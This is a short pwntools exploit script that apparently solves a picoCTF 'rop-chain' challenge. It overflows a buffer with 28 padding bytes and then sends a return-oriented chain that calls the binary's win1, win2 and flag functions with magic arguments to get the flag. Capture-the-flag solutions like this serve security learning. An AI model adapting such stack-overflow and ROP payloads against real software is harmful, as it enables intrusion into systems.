#!/usr/bin/env python

from pwn import *

local = 0
pico = 1

if pico:
	r = process("/problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d/rop")
elif local:
	r = process("./rop")
	gdb.attach(r, '''
		b *0x8048691
		c
		''')



win1 = 0x80485cb
win2 = 0x80485d8
arg2 = 0xBAAAAAAD
flag = 0x804862b
flagarg = 0xDEADBAAD

payload = ''
payload += 'A'*28
payload += p32(win1)
payload += p32(win2)
payload += p32(flag)
payload += p32(arg2)
payload += p32(flagarg)

r.sendline(payload)

r.interactive()